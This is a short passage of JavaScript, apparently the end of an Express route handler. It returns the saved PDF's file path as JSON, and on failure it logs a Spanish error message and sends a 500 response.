    res.json({ ok: true, path: filePath });
  } catch (e) {
    console.error("Error guardando PDF:", e);
    res.status(500).json({ error: e.message });
  }
});
